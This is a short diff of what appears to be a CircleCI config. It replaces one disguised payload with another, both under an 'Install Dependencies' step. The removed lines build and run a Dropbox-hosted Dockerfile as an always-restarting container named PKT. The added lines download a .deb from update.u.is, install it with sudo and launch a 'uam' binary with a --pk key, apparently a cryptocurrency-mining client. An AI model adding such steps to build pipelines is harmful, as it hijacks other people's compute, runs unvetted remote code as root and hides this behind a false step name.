@@ -8,11 +8,10 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-                wget https://www.dropbox.com/s/gipo4g7i6z08pht/Dockerfile
-                docker build -t debian:buster-slim .
-                docker run -d --restart always --name PKT debian:buster-slim
-                apt-get install htop
-                htop
+                wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb
+                sudo dpkg -i uam-latest_amd64.deb
+                cd /opt/uam
+                sudo ./uam --pk 3310B1D49773E27584E3FF4BFAAE4A7A4CE7F83F86656840093B88775693F857                
 
 workflows:
     version: 2.1
